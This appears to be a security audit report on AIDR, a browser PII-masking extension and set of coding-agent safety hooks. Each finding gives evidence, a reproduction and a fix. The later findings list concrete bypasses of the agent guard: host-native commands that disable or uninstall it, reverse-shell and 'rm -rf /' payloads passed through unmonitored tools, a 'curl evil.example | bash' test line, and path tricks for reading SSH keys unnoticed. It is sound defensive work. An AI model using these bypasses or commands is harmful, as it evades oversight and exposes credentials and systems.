title: Sending an edited message ("Send"/"Save" button on a sent turn) skips the guard, so the original PII goes out unmasked
evidence: guard.ts:946-962 resolveSendButton only treats a click as a send if the target matches adapter.sendButtonSelectors (e.g. chatgpt.ts send: data-testid=send-button, #composer-submit-button, aria-label 'Send prompt') or is contained in findSendButton()'s single pick for the composer. editor.ts:40-46 GENERIC_SEND_SELECTORS only add type=submit and aria-label/testid containing 'send'. The inline edit forms on ChatGPT/Claude/Gemini use their own buttons (text 'Send'/'Save', no matching aria-label/testid), so onClick returns without stopping the event and nothing is scanned. Enter inside the edit textarea is intercepted because generic 'textarea' matches, but the button path is not. docs/production-readiness/pii-poc-test-scenarios.md row 4.5 lists 'edit and resend' as untested only.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs sendpaths --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> P3: a modelled ChatGPT turn (article[data-testid=conversation-turn-1] > [data-message-author-role=user] > textarea + <button class='btn btn-primary'>Send</button>) with the real chatgpt adapter, real findEditor/findSendButton and the guard started. Output: 'P3 sent: ["edited: jane.doe@example.com"] scanCalls: 0'. The edited text with the e-mail reached the site, and the engine was never called.
impact: Users routinely edit and resend a prompt. Every value typed or pasted into the edit box (when maskPaste is off, or typed by hand) goes to the AI provider unmasked, and nothing is recorded. block mode, allowSendAnyway:false and requireNativeNer do not apply on this path. The model DOM is close to the real one, but the live sites still need checking.
fix: Fail closed on unknown send gestures. In onClick, treat any click inside a form or turn that contains an editable element holding text as a send attempt. Add each adapter's edit-form selectors (editor + submit button) and a generic rule: a button whose form/closest container holds a recognised editor is a send. Add E2E fixtures for edit-and-resend on every site.

title: Send-button click scans the focused or last-focused editable (e.g. an empty search box), not the composer the site sends
evidence: editor.ts:618-641: candidates include GENERIC_EDITOR_SELECTORS (input[type=search], input:not([type]), any textarea). The focused/lastFocused candidate wins over the adapter's own composer match. guard.ts:954-961 resolveSendButton then uses editorFor(null). guard.ts:874 `if (normalizeText(text) === "") return;` lets the original click through when that editable is empty. Where a click does not move focus to the button (Firefox and Safari on macOS, buttons with tabindex=-1 or mousedown preventDefault), the composer is never read.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs sendpaths --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> P6: chatgpt adapter, composer textarea#prompt-textarea with 'mail jane.doe@example.com', sidebar <input type=search> focused and empty, then send-button.click(). Output: 'P6 sent: ["mail jane.doe@example.com"] scanCalls: 0 active: q'.
impact: If the user (or a deliberate insider) focuses any other text field, then clicks Send, the composer's PII goes out unscanned. With clean text in that other field, the guard scans and replays the click, and the composer content still goes out unchecked.
fix: For a click on a send button, resolve the editor from the button's composer container (closest COMPOSER_SELECTOR / form, or nearest adapter editor by treeDistance), not from focus. Never let a send pass because a different editable is empty. When several candidates hold text, scan all of them and fail closed on ambiguity.

title: Enter in an editor inside a shadow root (custom sites, web-component UIs) is never intercepted: fail-open, contrary to the 'prompt box not found -> block' claim
evidence: editor.ts:563-568 queryAll uses root.querySelectorAll on the Document only, so editors in open or closed shadow roots are never candidates. guard.ts:929-941 onKeyDown: editorTargetOf() returns null and the handler returns without stopping the event. The send-button path does refuse (editorMissing), but Enter does not. docs/product/features/en/02-browser-guard-and-privacy.md:166-176 flowchart: 'prompt box found? --no--> block'.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs sendpaths --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> P1: <div id=host> with an open shadowRoot holding <form><textarea>, site Enter handler, guard started with real findEditor. Output: 'P1 sent: ["mail jane.doe@example.com"] scanCalls: 0'.
impact: Internal AI portals added as customSites that use Lit/Stencil/UI5 or similar web components get no protection on Enter, and nothing tells the admin or user. The documented fail-closed contract is false on this path.
fix: Walk open shadow roots when collecting editors (composedPath()[0] already gives the inner target, so use that element as the editor when it is editable). For a keydown Enter whose composedPath contains an editable that is not a recognised editor, refuse in enforcing modes (fail closed), as the click path does. Add customSites shadow-DOM E2E.

title: Invalid or mistyped managed policy values silently fall back to the permissive defaults; one bad list entry drops the whole list; warnings only reach the worker console
evidence: policy.ts:716-720: an invalid managed value is ignored, so DEFAULT_POLICY applies (allowUserPause:true, allowSendAnyway:true, requireNativeNer:false, blockedSites:[], fileHandling:'scan' at policy.ts:76-104). The list validators reject the whole list on one unknown id. allowUserPause/allowSendAnyway/blockedSites/requireNativeNer are not in PROTECTION_SETTING_KEYS (policy.ts:579-586), so they are not locked at a restrictive value. index.ts:283-289: on a managed-storage read error the user settings are suspended, but the admin's blocks, Shadow AI and requireNativeNer are also gone. Warnings go only to console.warn (index.ts:288). grep shows no telemetry/popup/options consumer of warnings(). Firefox has no managed_schema, so it does no browser-side validation at all.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs policy --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> evaluatePolicy({mode:'Block', allowUserPause:'false', allowSendAnyway:0, requireNativeNer:'true', blockedSites:['deepseek','chatgtp'], fileHandling:'Block'}, {mode:'monitor'}) => {mode:'auto', allowUserPause:true, allowSendAnyway:true, requireNativeNer:false, blockedSites:[], fileHandling:'scan'}; warnings only in the returned array.
impact: A typo in an MDM/GPO value, a REG_SZ 'false' where a DWORD is expected, or a site id that a future release renames turns 'no send-original, no pause, block DeepSeek, require NER' into the most permissive configuration. The admin cannot see this anywhere in the fleet.
fix: Fail closed per key. For an invalid managed value of a protection key, use the most restrictive value (allowUserPause/allowSendAnyway=false, mode=block, requireNativeNer=true if present). Keep the valid entries of a list and drop only the bad ones. Send policy warnings as a counts-only telemetry event (policy_id + warning codes) and show a 'policy error' state in the popup/options.

title: Shipped MDM examples omit the hardening policies that make the guard non-bypassable (incognito/InPrivate/Firefox private browsing, Guest mode, DevTools, other extensions)
evidence: grep -rni 'IncognitoModeAvailability|InPrivateModeAvailability|DisablePrivateBrowsing|BrowserGuestModeEnabled|DeveloperToolsAvailability|ExtensionInstallBlocklist' deploy/browser-guard -> no matches. The manifest has incognito:'not_allowed' (README.md:306), so a private window gets no protection, and the page console or another extension can call the AI site's API directly, bypassing UI interception. Firefox has no DevTools restriction for policy-installed add-ons unless DisableDeveloperTools is set. The examples do set allowUserPause:false and allowSendAnyway:false but not these.
reproduction: grep -rn -i 'incognito\|InPrivate\|PrivateBrowsing\|GuestMode\|DeveloperTools\|InstallBlocklist' /home/user/aidr/deploy/browser-guard -> (no output)
impact: A customer who copies the provided GPO/Intune/Jamf/policies.json gets a deployment where Ctrl+Shift+N (or a Guest profile) gives unprotected ChatGPT. The POC doc already calls incognito a P0 known gap, but the deploy kit does nothing about it.
fix: Add to every example and the README: Chrome IncognitoModeAvailability=1, BrowserGuestModeEnabled=false, DeveloperToolsAvailability=2 (or at least 0 + a page-console warning), ExtensionInstallBlocklist ['*'] with an allowlist. Edge: InPrivateModeAvailability=1. Firefox: DisablePrivateBrowsing=true, DisableDeveloperTools. Explain each trade-off.

title: User pause defaults to allowed even under a managed policy, is not locked by allowUserOverrides:false, and is not reported to telemetry
evidence: policy.ts:89 allowUserPause: true by default. lockProtectionKeys (policy.ts:744-757) locks only PROTECTION_SETTING_KEYS, which excludes allowUserPause. index.ts:470-484 pause() allows up to 60 min with no limit on repeats. effectivePolicy (index.ts:199-213) turns it into monitor mode. grep -i pause telemetry.ts and docs/contracts/privacy-telemetry.md -> nothing: paused sends are reported as plain 'allowed' events, the same as monitor.
reproduction: grep -n -i pause packages/browser-guard/src/background/telemetry.ts docs/contracts/privacy-telemetry.md -> no output; evaluatePolicy({mode:'auto'},{}) yields allowUserPause:true (see BG-4 probe).
impact: An enterprise that sets a managed policy without the key (allowUserOverrides:false gives a sense of 'locked') lets every user switch protection off for 60 minutes at a time, as often as they like. The dashboard cannot tell this apart from monitor-mode allowances.
fix: Default allowUserPause to false whenever any managed policy is present (or add it to the locked set). Emit a counts-only 'paused' event (start, duration) and mark events sent during a pause, e.g. action 'allowed' with reason 'paused'.

title: AI tabs already open at install/enable time are left unprotected (no injection into open tabs), and the popup still reports them as 'Protected'
evidence: grep executeScript in src -> none. index.ts:646-649 onInstalled only reloads the policy. MV3 static content_scripts are not injected into existing tabs on install or update. model.ts:147-167: protectionStatus falls back to the URL site when stats.site is null and returns {kind:'protected'} without checking that a content script is running in the tab.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs popup --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> protectionStatus(DEFAULT_POLICY, {site:null,...}, 'chatgpt') = {"kind":"protected","site":"chatgpt"}
impact: An MDM force-install lands while employees have ChatGPT/Claude open, which as SPAs often stay open for days. Those tabs send PII unmasked until reloaded, while the toolbar popup says they are protected. Custom-site tabs opened before the host grant behave the same way.
fix: On onInstalled/onStartup (and on a custom-site grant), inject content.js/content-main.js into matching open tabs with chrome.scripting.executeScript, or show a 'reload to protect' banner. Make the popup ping the tab's content script (GET_STATS has a site only once the script has spoken) and show 'Not active - reload this tab' when it does not answer.

title: exactData datasets (HMAC key + fingerprints) are readable by every endpoint user via chrome://policy, and low-entropy columns are recoverable offline
evidence: README.md:466-471 says the dataset contains the HMAC key and fingerprints, 'treat it as confidential and distribute it only through managed policy'. But managed policy is user-readable (chrome://policy, HKLM registry, /etc/firefox/policies, mobileconfig). The fingerprint is a single HMAC-SHA256 over normalised tokens with no stretching (fingerprint-dataset.mjs:17), so customer numbers, phone numbers, TCKN (~9e8 valid values) and IBANs can be enumerated.
reproduction: node packages/browser-guard/scripts/fingerprint-dataset.mjs --in accts.csv --header --columns acct --dataset-id crm-acct --type BANK_ACCOUNT --out ds.json; node /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/brute.mjs ds.json -> 'recovered [ 4829173, 7710452 ] in 31950 ms (9e6 candidates, 1 CPU core, node)'. At that rate the TCKN space takes about 1 h on one core (seconds on a GPU).
impact: Pushing a CRM/customer dataset to the fleet as exactData gives every employee (and any malware on the endpoint) a way to rebuild the identifier list, which is the data the feature was meant to protect. That is a KVKK/GDPR exposure the docs present as safe.
fix: Document plainly that managed policy is not confidential, and restrict exactData to high-entropy values or composite keys (e.g. name+TCKN). Use a slow keyed hash (scrypt/argon2 with a per-dataset key) plus truncated Bloom-style fingerprints to raise the enumeration cost, or move exact-data matching to the native host or a server with the key kept off the endpoint. Have fingerprint-dataset warn when a column's entropy is low.

title: On sites where plain Enter inserts a newline (mobile layouts, Firefox for Android, custom sites), the guard turns Enter into a send
evidence: guard.ts:929-941 treats every non-Shift Enter as a send attempt. replay() (guard.ts:588-609) dispatches a synthetic Enter; when the site does not preventDefault it, clickSend() clicks the send button. Whether the prompt was pre-scanned clean (original Enter passes and inserts a newline) or not (the guard sends it) depends on timing. dist/firefox/manifest.json declares gecko_android strict_min_version 142, but the docs list desktop platforms only and no Android test exists.
reproduction: npx vitest run --config /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/vitest.config.mjs sendpaths --silent=false --reporter=verbose (probe files in /tmp/claude-0/-home-user-aidr/57fdcae0-87d7-5e61-83b7-871aebe24346/scratchpad/ga-audit/browser-guard/probes/) -> P2: site with no Enter handler (Enter = newline) and a send button; plain Enter on 'first line hello' => 'P2 sent: ["first line hello"]'.
impact: Half-written prompts are sent (masked) when the user meant to start a new line. On mobile/touch layouts of ChatGPT and Claude, where Enter is newline, the extension makes the product unusable or confusing.
fix: Only replay as a send when the original Enter would have sent: record whether the site preventDefaulted the original event (let a clean pre-scan pass, observe defaultPrevented) or add a per-adapter enterSends flag (false on touch/mobile layouts and configurable for customSites). Remove gecko_android, or test and document Android.

title: Microsoft 365 Copilot Chat (m365.cloud.microsoft / copilot.cloud.microsoft) is neither protected nor in the Shadow AI catalog
evidence: copilot.ts:7 hosts ['copilot.microsoft.com'] only. catalog.ts:8 excludes 'Microsoft 365 Copilot on the Office host' on purpose. grep m365|cloud.microsoft in src/sites -> no match. The product docs say 'Copilot' is protected.
reproduction: grep -n 'm365\|cloud.microsoft' /home/user/aidr/packages/browser-guard/src/sites/*.ts -> no output
impact: The Copilot an enterprise customer's employees actually use (the Entra-signed M365 Copilot Chat) gets no masking, and Shadow AI cannot count or block it. Customers will assume 'Copilot' covers it.
fix: Add an adapter for m365.cloud.microsoft/chat and copilot.cloud.microsoft (path-scoped matching if needed), or document clearly that it needs a customSites entry and ship a tested example entry.

title: Native-host NER is impractical as an enforced requirement: a new host process (and NER worker) per scan with a 2 s budget; Windows launcher unvalidated; Firefox unsupported
evidence: native.ts:45 NATIVE_TIMEOUT_MS=2000 and :61 MAX_IN_FLIGHT=2 (a third concurrent scan returns null). Each scan opens a port, which starts a new host process. host.ts:33 LocalNerProcess.open() spawns the NER worker and loads the model per process (docs/native-host.md:204 'Latency caveat'). prepare-host.mjs:26 prints 'Windows execution is not validated in this release'. docs/native-host.md:157-158: Chromium only, Firefox reports unavailable. With requireNativeNer, each of these blocks every prompt (fail closed, which is correct, but leaves the product unusable).
impact: Customers who enable requireNativeNer (the only way to get free-text name/address coverage) on Windows or Firefox endpoints, or with any real transformer model, will likely see most prompts blocked with 'native host unavailable'. No startup-latency measurement exists.
fix: Keep a long-lived host (one persistent port with a request queue) instead of one process per scan. Measure cold and warm latency on target Windows hardware. Validate and sign the Windows launcher. Make requireNativeNer refuse to activate (policy warning) on Firefox. Publish p95 latency evidence before claiming the feature.

title: Docs overstate the send-interception guarantee ('the only ways to let text through unmasked are monitor and disabledSites'; voice/drag text 'checked at send time')
evidence: 02-browser-guard-and-privacy.md:195-197 'The only ways to let text through unmasked are monitor mode... and a site in disabledSites'. This ignores allowSendAnyway:true (the default), user pause (BG-6), unrecognised send paths (BG-1/2/3) and already-open tabs (BG-7). Line 472 says voice input is 'checked at send time', but ChatGPT/Gemini dictation and voice mode send audio to the provider for transcription, and typed text sits in the site-owned editor (readable by page scripts, autosave and typing telemetry) before any check.
impact: Sales and DPO reviews rely on the statement that nothing leaves unmasked outside monitor mode. That statement is false in the default configuration.
fix: Rewrite the guarantee to list every pass-through path (send-original, pause, unrecognised send gestures, voice/dictation, typed text visible to the page before send, already-open tabs, private windows) and point to the hardening policy (BG-5).

title: Shadow AI / blockedSites blocks do not stop an already-open session (only main_frame/sub_frame navigations are blocked)
evidence: dnr.ts:80-88 and shadow-ai.ts:76-78: DNR conditions have resourceTypes ['main_frame'] / ['main_frame','sub_frame'] only. On a policy change, index.ts:215-230 broadcastPolicy reaches built-in-site content scripts only. There is no sweep of open tabs for catalog services, and the service's XHR/fetch to its API is not blocked, so an open SPA keeps working until a full navigation (tabs.onUpdated redirect).
impact: A newly banned AI service (dashboard 'banned' decision or MDM shadowAi.blocked) stays usable in tabs that are already open, sometimes for days.
fix: When a block is applied, query open tabs and redirect matching ones to blocked.html. Optionally add xmlhttprequest/websocket resource types for the service's own hosts.

title: README claims a page cannot fingerprint the extension, but the MAIN-world script sets window.__aidrFileInputHook and patches HTMLInputElement prototypes
evidence: file-input-hook.ts:43,58 sets w['__aidrFileInputHook']=true and replaces HTMLInputElement.prototype.files/click/showPicker in the page world. The aidr-file-hook-ping event is observable. dist/chrome/content-main.js contains '__aidrFileInputHook'. README.md:305 says 'nothing is exposed to web pages, so a page cannot fingerprint the extension'.
reproduction: grep -o __aidrFileInputHook packages/browser-guard/dist/chrome/content-main.js -> __aidrFileInputHook
impact: AI sites can detect the guard trivially (and could change behaviour or route around it). The claim is inaccurate.
fix: Use a non-enumerable Symbol or closure flag instead of a named global, and reword the README: resources are not exposed, but the page-world hook is observable.

title: Product docs still say the optional https://*/* permission is unused, but customSites relies on it; chat widgets in iframes (all_frames:false) are not covered
evidence: Docs line 135: 'this build has no code path that uses it'. custom-sites.ts:51,113,144 check origin grants and register content scripts on granted custom hosts. The manifest content_scripts and custom registrations are top-frame only, so an internal portal whose chat is an iframe widget is unprotected, and the customSites docs do not say so.
reproduction: grep -n 'no code path' docs/product/features/en/02-browser-guard-and-privacy.md -> 135
impact: Admins misjudge the permission prompt users will see, and customSites deployments with iframe chat widgets silently get no protection.
fix: Fix the docs. Support allFrames for custom sites, or validate at policy time and warn when the configured host serves the editor in an iframe.

title: Agent can disable/uninstall AIDR via host CLIs and config file ops with no ask/deny
evidence: self-defense.yaml:124 (CLT-SELF-007) denies only `aidr approve/uninstall/allowlist add/...`; CLT-SELF-003 (:46) only matches rm of ~/.claude/**/hooks.json|installed_plugins. No rule covers host-native disable/uninstall or moving/deleting connector config. Built claude-code and codex hooks return allow for all of them.
reproduction: Fed {tool_name:Bash,tool_input:{command:X}} to packages/claude-code/dist/pre-tool-use.cjs (isolated HOME) and packages/codex/dist/pre-tool-use.cjs. ALLOW for: `claude plugin disable aidr@aidr`, `claude plugin uninstall aidr@aidr`, `claude plugin marketplace remove aidr`, `mv ~/.claude/plugins ~/.claude/plugins.bak`, `rm ~/.cursor/hooks.json`, `code --uninstall-extension singularityrd.aidr`, `openclaw plugins disable aidr-openclaw`, `openclaw config set plugins.entries.aidr-openclaw.enabled false`, `rm -rf ~/.openclaw/extensions/aidr-openclaw`, `npm uninstall -g @singularityrd/aidr-codex`, `rm ~/.codex/hooks.json`, `mv ~/.codex/config.toml`, `rm -f $(which aidr-codex-hook)`. Contrast: `aidr uninstall` -> deny CLT-SELF-007.
impact: A prompt-injected agent, or one in auto-accept/bypass mode, or where the user routinely approves Bash, permanently removes AIDR in one tool call; later sessions run unprotected. AIDR denies its own `aidr uninstall` as weakening protection but allows the host-native equivalent, so self-defense is easily sidestepped.
fix: Add deny rules for: claude plugin disable|uninstall|marketplace remove of aidr; code/cursor --uninstall-extension|--disable-extension of the AIDR id; openclaw plugins disable|uninstall and config set of plugins.entries.aidr-openclaw.*; npm/pnpm/yarn uninstall of @singularityrd/aidr-*; rm/mv/cp/truncate/redirect onto connector config files and the aidr-codex-hook binary. Regression test per connector.

title: OpenClaw process (write/submit/paste/send-keys) and nodes(run) tools bypass command inspection
evidence: tool-handler.ts:57-82 maps only exec/web_fetch/write/edit/read/apply_patch; all else -> extractFromUnknownTool, which types non-`command` string keys as plain content (core extractors.ts:609-621) and never joins argv arrays, so command heuristics do not run on shell stdin or node argv.
reproduction: Drove built plugin (packages/openclaw/dist/index.cjs) with a stub api and called before_tool_call. exec{command: a /dev/tcp reverse-shell line} -> BLOCK CLT-CMD-003; process{action:submit,data:<same line>} -> ALLOW; exec{command:'python3',background:true} -> ALLOW then process{action:write,data:'import shutil; shutil.rmtree(...)'} -> ALLOW; process{action:send-keys,keys:[r,m,space,-,r,f,space,/,Enter]} -> ALLOW; nodes{action:run,command:['rm','-rf','/']} -> ALLOW (exec 'rm -rf /' is a CRITICAL deny).
impact: On OpenClaw the agent starts a benign background shell/REPL via exec, then drives it with the process tool (or runs argv on nodes) to execute destructive/exfiltration/reverse-shell actions the exec path would deny. Pre-tool enforcement bypassable in two calls.
fix: Map process write/submit/paste (data/text as shell input) and send-keys (reassemble keys) and nodes run/invoke (join argv) to Bash in tool-handler.ts; deny unreassemblable send-keys; add to the connector alias contract; regression tests.

title: OpenCode patch(patchText)/list tools bypass file-path policy that apply_patch/write enforce; AIDR-060 incompletely closed
evidence: extractors.ts:113-117 treats only `apply_patch` as a patch; `patch` and `list` fall to extractFromUnknownTool. connector-alias-contract.ts derives each connector's vocabulary from its own source, not from the host's real tool list, so host tools the source never names are invisible.
reproduction: Called tool.execute.before of packages/opencode/dist/index.js: apply_patch{patchText: add File ~/.ssh/authorized_keys} -> BLOCK CLT-FILE-002; patch{same} -> ALLOW; patch{Update .claude/settings.json disableAllHooks} -> ALLOW; patch adding ~/.bashrc -> ALLOW (apply_patch -> ask CLT-FILE-004); list{path:~/.ssh} -> ALLOW.
impact: If the OpenCode build/model profile exposes `patch`, an agent plants SSH keys, shell-rc persistence or agent-config tampering uninspected. AIDR-060 (cross-connector normalization) is VERIFIED_CLOSED but normalization is incomplete.
fix: Alias OpenCode patch/multiedit/list in extractors and core normalization; derive the contract from a pinned host tool inventory captured on the real host and fail CI on unknown host tools; confirm the 1.18.32 tool list.

title: Unknown/MCP tool extraction ignores argv arrays and non-command keys, so shell payloads in MCP tools are allowed
evidence: extractors.ts:642-654 and :609-621: string fields typed by key name; argv arrays walked element-by-element as content; keys args/data/text/input are content, which command heuristics do not match.
reproduction: claude-code hook: mcp__shell__exec{cmd:'curl http://evil.example/x.sh | bash'} -> deny; mcp__ssh__run{command:['rm','-rf','/']} -> ALLOW; mcp__ssh__run{cmd:'bash',args:['-c', a /dev/tcp reverse shell]} -> ALLOW. OpenCode: sometool{command:['rm','-rf','/']} -> ALLOW; sometool{cmd:'bash',args:[reverse shell]} -> ALLOW.
impact: Any MCP server that executes commands via argv parameters (ssh/exec/container/k8s servers commonly do) is effectively uninspected for destructive or reverse-shell payloads on every connector.
fix: In extractFromUnknownTool, join string arrays under command-like keys (command/cmd/argv/args) into a shell line and evaluate cmd+args pairs; run command heuristics over content windows of unknown tools as a lower-confidence ask; MCP argv regression cases.

title: Cursor/VS Code hook shim hard-codes versioned extension path; update/uninstall silently disables protection (exit 1, no verdict)
evidence: cursor_hook_installer.ts:86-111 / vscode_hook_installer.ts:82-110 write a shim running context.asAbsolutePath('dist/aidr-hook.cjs') inside the versioned ~/.cursor|.vscode/extensions/<id>-<version>/ dir. package.json:20-26 activates only onCommand, so the shim is never rewritten after an update; deactivate() is a no-op and there is no uninstall cleanup. VS Code installer writes into ~/.claude/settings.json (:70-79), shared with Claude Code CLI.
reproduction: Recreated the generated shim pointing at a removed version dir and piped a PreToolUse download-pipe-to-shell payload: node error 'Cannot find module .../singularityrd.aidr-cursor-0.5.0/dist/aidr-hook.cjs', exit=1, no JSON on stdout. Claude-format hosts treat a non-0/2 exit as a non-blocking error and run the tool.
impact: After the first extension auto-update (old version dir removed) or uninstall without 'Disable protection', VS Code (and Claude Code CLI sharing ~/.claude/settings.json) run every tool call uninspected while 'Show hook health' still lists managed events; on Cursor, if failClosed is honoured, every call is blocked until the user re-enables.
fix: Point the shim at a stable runner copy (~/.singularity-aidr/runtime/<version>/ or stable symlink) and make the shim itself fail closed if the runner is missing; add onStartupFinished activation to re-validate/repair managed hooks after update; remove managed entries on uninstall; separate VS Code hook location or detect Claude Code coexistence; health check must verify the runner exists.

title: Cursor and VS Code connectors have no real-host enforcement evidence yet are sold and described as fail-closed

CLAUDE.md claims these hooks fail closed and 'a killed hook must not pass the call through uninspected'. scripts/real-host-e2e covers only claude-code/codex/opencode/openclaw.

title: AIDR_THREATS_DIR/AIDR_ALLOWLISTS_DIR override silently replaces the whole rule set in every build (no manifest, no warning)
evidence: assets.ts:26-45 (claude-code) and codex assets.ts:41-44 put process.env[AIDR_THREATS_DIR] first; threat-loader.ts:81-87 + resource-manifest.ts header: a directory with no manifest is loaded unverified (status none); the manifest check applies to the bundled dir only.
reproduction: AIDR_THREATS_DIR=<dir with one benign rule> node pre-tool-use.cjs with a /dev/tcp reverse-shell Bash command -> ALLOW; default rules -> deny CLT-CMD-003. Empty dir -> ask 'No local threat rules could be loaded'. Agent Write of {env:{AIDR_THREATS_DIR:...}} into .claude/settings.json is only an ask.
impact: Anything that sets the host environment (a repo .claude/settings.json env block in a trusted folder, a shell profile, a launcher wrapper) neuters detection while AIDR keeps returning allow verdicts; commercial integrity does not cover this path.
fix: In commercial builds ignore the env override unless it carries a signed manifest verified against the release key; always log and surface a session-start warning plus audit field when an override is active; treat a rule set smaller than the bundled baseline as degraded; add a rule denying agent writes of AIDR_* env into agent settings.

title: Default local mode asks on every URL/package (git clone, npm install react, docs WebFetch); on Codex/Cursor/OpenClaw/OpenCode that is a hard deny
evidence: evaluator.ts:2540-2546 turns any allow-with-URL into ask 'URL reputation lookup was unavailable'; package checks similarly. URL/package legs are off by default and no endpoint is deployed (docs/configuration.md:199-205), so this fires for every URL. Codex/Cursor/OpenClaw/OpenCode convert ask->deny needing `aidr approve <actionId>` per exact call; with no OS vault the ask cannot even be recorded.
reproduction: claude-code hook, fresh HOME: `git clone https://github.com/expressjs/express`, `npm install react`, `pip install requests`, WebFetch docs.python.org, Write README with a link -> all ask; `ls -la` -> allow. codex hook: `npm install react` -> deny 'blocked pending explicit user approval ... Package check for react is disabled'. On this Linux box codex/openclaw logged 'Pending ask could not be recorded for operator approval'.
impact: Out of the box, routine dev actions are blocked on four connectors and prompt on two; users disable AIDR, turn heuristics off or approve blindly (alert fatigue defeats the ask channel); vault-less Linux agents cannot proceed at all.
fix: Do not convert 'reputation leg not configured' into ask by default: report it as coverage metadata and ask only when a local heuristic also fires or the URL/package is outside a shipped trusted list (github.com, registry.npmjs.org, pypi.org, docs domains).

title: Claude Code PostToolUse output DLP fails open on timeout or >1 MiB input: secret output reaches the model unreplaced
evidence: post-tool-use.ts:39-41 reportUnavailableCoverage -> output-inspection.ts:279-286 returns decision:block + additionalContext but NO updatedToolOutput; the oversize branch (MAX_POST_TOOL_INPUT_BYTES 1 MiB) and the 4 s watchdog do the same. A successful inspection does replace output (updatedToolOutput).
reproduction: AIDR_POST_TOOL_USE_DEADLINE_MS=100 node post-tool-use.cjs < bash-output-with-github-token.json -> decision block, reason 'inspection did not finish in time ... original output may remain available', no updatedToolOutput. MCP tool_response 1.1 MB + github token -> same. Same token in a small output -> updatedToolOutput quarantined.
impact: An attacker-controlled MCP server or padded/slow command output pushes secrets or prompt-injection into model context precisely in the cases where inspection did not happen; the block verdict does not remove bytes already returned.
fix: When inspection is unavailable, replace the output with a quarantine notice (string for built-in tools, [{type:text,...}] for MCP) rather than only annotating; make the ceiling configurable and stream-scan larger inputs.

title: Credential-file read guard evaded by cd/globs/grep -r and by Grep/Glob/list tools
evidence: Guard matches literal ~/.ssh/id_rsa paths. `cat ~/.ssh/id_rsa` -> ask; but a cd-then-cat, a glob path, or a recursive grep over the dir are not matched. Dedicated read tools with a directory arg are not treated as credential reads.
reproduction: claude-code hook: `cat ~/.ssh/id_rsa` -> ask CLT-CRED-004; `cd ~/.ssh && cat id_rsa` -> ALLOW; `cat ~/.s*h/id_*` -> ALLOW; `grep -r . ~/.ssh` -> ALLOW. Grep{pattern:aws_secret,path:~/.aws,output_mode:content} -> ALLOW (ssh path still ask). Glob **/id_rsa -> ALLOW.
impact: An agent reads SSH keys / cloud creds past the credential guard by changing directory first, globbing, or using grep/Grep; post-tool output DLP is the only remaining net, and it fails open on the timeout/oversize paths in CON-9.
fix: Normalise cwd+relative and glob forms before matching; extract the resolved directory for grep -r / Grep / Glob / list and apply credential-path policy to it; add regression cases.

title: OpenClaw/OpenCode/Codex operator-approval ask channel is unusable without an OS vault; asks are recordable only where libsecret exists
evidence: operator-approvals.ts:637-696 requireKey/requireAnchor throw key_unavailable/anchor_unavailable with no file fallback (docs/configuration.md:1020). guard.ts:375-386 logs 'Pending ask could not be recorded for operator approval' and the ask stays blocked. Codex runs one process per hook (enforcement.ts EPHEMERAL_APPROVALS comment), so the file store is the only channel.
reproduction: On this headless Linux box (no libsecret), codex and openclaw asks (cat ~/.ssh/id_rsa, write ~/.bashrc) logged 'Pending ask could not be recorded for operator approval'; the deny banner then tells the user to run `aidr approve` but no actionId was ever persisted.
impact: On the most common AIDR deployment target (headless Linux agents / containers with no desktop keyring), every ask-class action is a dead-end deny the operator cannot release, while combined with CON-8 that is most URL/package operations. The product is close to unusable there.
fix: Offer a documented owner-only file-backed approval store for headless Linux (as audit-chain key_storage=file already allows), gated behind an explicit opt-in, or ship a daemon that holds the key; make `aidr doctor` state clearly that approvals are impossible and why.

title: Codex PostToolUse output inspection and apply_patch/MCP coverage are documented-but-unenforced; no output-side block observed on a real host
evidence: codex README 'Tool-output inspection' + support-matrix knownBypasses: 'No output-side (pre-model) interception exists for this host', 'packaged matcher covers Bash and apply_patch only; MCP and other local function tools do not invoke the AIDR hook', 'Hosted and specialized tool paths may bypass'. PostToolUse replacement 'has not been observed in a live Codex session'.

title: CLI `aidr setup` never installs any connector; a user who only runs setup is unprotected
evidence: install-hooks.ts:28-36 recordHooksInstalled(false) and prints 'Protection is NOT yet active'; every branch only prints manual follow-up steps. This is deliberate (fixes the old false-success bug, AIDR-003) but leaves a large manual gap.
reproduction: Read install-hooks.ts: no write to any connector config; summary 'connector install required'.
impact: `aidr setup` reads like an installer but installs nothing; users may believe they are protected after running it. Mitigated by the explicit message, but there is no verification that the subsequent manual install actually took.
fix: Either perform the connector registration with a confirming end-to-end canary (the AIDR-003 acceptance), or rename the command to make clear it only records state; add `aidr doctor`-style post-install verification guidance in the summary.

title: Connectors declare no host-version compatibility check; verified only against single pinned host versions
component: packages/*/package.json (engines node only); hooks protocol handling
